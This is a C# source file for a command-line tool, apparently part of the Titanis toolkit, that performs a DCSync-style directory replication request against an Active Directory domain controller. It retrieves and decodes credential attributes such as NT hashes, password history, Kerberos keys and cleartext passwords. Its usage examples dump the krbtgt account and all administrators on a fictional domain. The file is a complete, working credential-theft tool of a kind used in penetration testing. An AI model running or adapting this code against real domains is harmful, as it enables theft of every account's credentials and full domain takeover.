using ms_drsr;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Titanis;
using Titanis.Cli;
using Titanis.Ldap;
using Titanis.Msrpc.Msdrsr;
using Titanis.Net;
using Titanis.Winterop.SamServer;
using Titanis.Winterop.Security;

namespace Dsrep;

[Command]
[Description("Requests replica changes")]
[OutputRecordType(typeof(LdapEntry), DefaultOutputStyle = OutputStyle.List, DefaultFields = [
	nameof(LdapAttributeTypes.SAMAccountName),
	nameof(LdapAttributeTypes.GivenName),
	nameof(LdapAttributeTypes.UserPrincipalName),
	nameof(LdapAttributeTypes.InstanceType),
	nameof(LdapAttributeTypes.UserAccountControl),
	nameof(LdapAttributeTypes.DBCSPwd),
	nameof(LdapAttributeTypes.UnicodePwd),
	nameof(LdapAttributeTypes.LmPwdHistory),
	nameof(LdapAttributeTypes.NtPwdHistory),
	nameof(LdapAttributeTypes.SupplementalCredentials),
	])]
[DetailedHelpText(@"This command uses [MS-DRSR] to query attributes of an object by SID, GUID, distinguished name, LDAP query, or object name.

In addition to the standard attributes defined by Active Directory, you may query the special attributes kerberosKeys, kerberosOldKeys, or cleartextPassword.  When one of these attributes is specified, {0} implicitly queries supplementalCredentials and unpacks the credentials contained within.")]
[Example("Query for all objects with all attributes", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1", Tag = "milchick_all")]
[Example("Query credentials for krbtgt and milchick", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1 krbtgt, \"CN=Seth Milchick,OU=Severed Floor,OU=Kier\\, PE,DC=lumon,DC=ind\" -OutputFields samAccountName, objectSid,  kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory", Tag = "milchick_name_dn")]
[Example("Query credentials for all administrators", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1 (memberOf*=<SID=S-1-5-32-544>) -OutputFields samAccountName, objectSid,  kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory", Tag = "milchick_LdapQuery")]
public class ReplicateCommand : RpcCommand<DirectoryReplicationClient>
{
	[Parameter(After = nameof(RpcCommand.ServerName))]
	[Description("DN, GUID, or SID of object to retrieve")]
	public DsobjSpec[]? ObjectName { get; set; }

	private string[] GetLdapAttributes(string[] fieldNames)
	{
		List<string> attrs = new(fieldNames.Length);
		HashSet<string> fieldsAdded = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
		bool wantsSuppCreds = false;
		foreach (var name in fieldNames)
		{
			if (fieldsAdded.Add(name))
			{
				var attr = LdapAttributeTypes.TryGetByNameOrOid(name);
				if (attr != null)
					attrs.Add(attr.Oid);
				else if (Array.IndexOf(SupplementalCredetialAttributes, name.ToUpper()) >= 0)
					wantsSuppCreds = true;
				else
					this.WriteWarning($"Attribute name '{name}' could not be resolved.");
			}
		}

		if (wantsSuppCreds)
			attrs.Add(LdapAttributeTypes.SupplementalCredentials.Oid);

		return attrs.ToArray();
	}

	private readonly static string[] SupplementalCredetialAttributes = [
		"KERBEROSKEYS",
		"KERBEROSOLDKEYS",
		"CLEARTEXTPASSWORD",
		];

	protected override async Task<int> RunAsync(DirectoryReplicationClient client, CancellationToken cancellationToken)
	{
		var dcInfos = await client.GetDcInfo(this.RpcParameters.Authentication.UserDomain, cancellationToken);
		if (dcInfos.Length == 0)
		{
			this.WriteError($"Unable to find any DCs.");
			return 1;
		}
		var dcInfo = dcInfos[0];

		LdapClient? ldapClient = null;


		
		var outputAttrs = GetLdapAttributes(this.OutputFields);
		var objSpecs = this.ObjectName;
		if (objSpecs.IsNullOrEmpty())
		{
			objSpecs = [new DsobjSpec(LdapFilter.Parse("(objectClass=*)"))];
		}

		foreach (var objSpec in objSpecs)
		{
			var objName = objSpec.Dsname;
			if (objName is not null)
			{
				await this.ReplicateObject(client, dcInfo, outputAttrs, objName, cancellationToken);
			}
			else
			{
				ldapClient ??= await LdapClient.Connect(new DnsEndPoint(this.ServerName, 389), null, this.RequireService<ISocketService>(), this.RequireService<IClientCredentialService>(), cancellationToken);

				LdapSearchResult? result;
				var filter = objSpec.Filter ?? LdapFilter.Parse($"(anr={objSpec.Name})");
				result = await ldapClient.Search(new LdapQuery(ldapClient.DomainRoot, LdapSearchScope.Subtree, filter, []), cancellationToken);
				if (result.Entries.Length == 0)
					this.WriteWarning($"The LDAP query with filter '{objSpec.Filter.ToString()}' did not return any results");
				else
				{
					foreach (var entry in result.Entries)
					{
						await this.ReplicateObject(client, dcInfo, outputAttrs, new DsName(Guid.Empty, null, entry.EntryName), cancellationToken);
					}
				}
			}
		}

		return 0;
	}

	private async Task ReplicateObject(DirectoryReplicationClient client, DomainControllerInfo dcInfo, string[] outputAttrs, DsName objName, CancellationToken cancellationToken)
	{
		var objs = await client.GetNcChanges(dcInfo, objName, outputAttrs, 1, cancellationToken);
		foreach (var obj in objs)
		{
			List<LdapAttribute> returnedAttrs = new List<LdapAttribute>(obj.Attributes.Length);
			for (int i = 0; i < obj.Attributes.Length; i++)
			{
				DsAttribute? attr = obj.Attributes[i];
				var attrType = LdapAttributeTypes.TryGetByNameOrOid(attr.Oid);

				var name = attrType?.Name;
				object[] values;
				if (attrType != null && attrType.Syntax != null)
				{
					values = Array.ConvertAll(attr.Values, r => attrType.Syntax.DecodeDsrep(r.Bytes));

					if (attrType.Oid == LdapAttributeTypes.SupplementalCredentials.Oid && attr.Values.Length > 0)
					{
						var suppBytes = attr.Values[0];
						try
						{
							var suppCreds = SamServer.DecodeSupplementalCredential(suppBytes.Bytes);
							if (suppCreds.KerberosKeys.Length > 0)
								returnedAttrs.Add(new LdapAttribute(new AttributeTypeDescription(AttributeTypeDescriptionFlags.None, "kerberosKeys"), suppCreds.KerberosKeys));
							if (suppCreds.KerberosOldKeys.Length > 0)
								returnedAttrs.Add(new LdapAttribute(new AttributeTypeDescription(AttributeTypeDescriptionFlags.None, "kerberosOldKeys"), suppCreds.KerberosOldKeys));
							if (suppCreds.CleartextPassword != null)
								returnedAttrs.Add(new LdapAttribute(new AttributeTypeDescription(AttributeTypeDescriptionFlags.None, "cleartextPassword"), [suppCreds.CleartextPassword]));
						}
						catch
						{

						}
					}
				}
				else
				{
					values = Array.ConvertAll(attr.Values, r => r.Bytes);
				}

				returnedAttrs.Add(new LdapAttribute(attrType, values));
			}
			LdapEntry entry = new LdapEntry(obj.Name.Name, returnedAttrs.ToArray());

			this.WriteRecord(entry);
		}
	}
}

[TypeConverter(typeof(DsobjSpecConverter))]
public class DsobjSpec
{
	public DsobjSpec(DsName dsname)
	{
		this.Dsname = dsname;
	}
	public DsobjSpec(LdapFilter filter)
	{
		this.Filter = filter;
	}
	public DsobjSpec(string name)
	{
		this.Name = name;
	}

	public DsName? Dsname { get; }
	public LdapFilter? Filter { get; }
	public string? Name { get; }
}

public class DsobjSpecConverter : TypeConverter
{
	public override bool CanConvertFrom(ITypeDescriptorContext? context, Type sourceType) => (sourceType == typeof(string)) || base.CanConvertFrom(context, sourceType);
	public override object? ConvertFrom(ITypeDescriptorContext? context, CultureInfo? culture, object value)
	{
		if (value is string str)
		{
			if (str.StartsWith('('))
				return new DsobjSpec(LdapFilter.Parse(str));
			else if (DsName.TryParse(str, out var dsName))
				return new DsobjSpec(dsName);
			else
				return new DsobjSpec(str);
		}
		else
			return base.ConvertFrom(context, culture, value);
	}
}
